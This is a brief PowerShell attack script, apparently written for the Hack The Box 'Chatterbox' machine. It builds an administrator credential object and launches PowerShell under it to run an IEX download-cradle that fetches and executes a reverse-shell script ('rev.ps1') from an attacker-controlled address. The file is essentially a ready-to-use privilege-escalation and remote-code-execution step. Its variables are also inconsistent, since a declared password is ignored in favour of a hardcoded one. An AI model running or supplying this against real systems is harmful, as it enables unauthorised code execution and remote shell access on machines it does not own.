<#
auth: @cyhfvg https://github.com/cyhfvg
date: 2023/01/30

do not execute this script directly.


just copy statement one by one, and paste to basic shell to execute
    for store creds into this basic shell session.


ref:
    [HTB: Chatterbox](https://app.hackthebox.com/machines/Chatterbox)
#>

# change this {{{1
$username = 'administrator';
$passwd = 'p@ssw3rd135246';
$command = "IEX(New-Object Net.webClient).downloadString('http://<revIP>/rev.ps1')";
# }}}

$secPasswd = ConvertTo-SecureString 'Welcome1!' -AsPlainText -Force;
$creds = New-Object System.Management.Automation.PSCredential($username, $secPasswd);

Start-Process -FilePath "powershell" -argumentlist $command -Credential $creds;
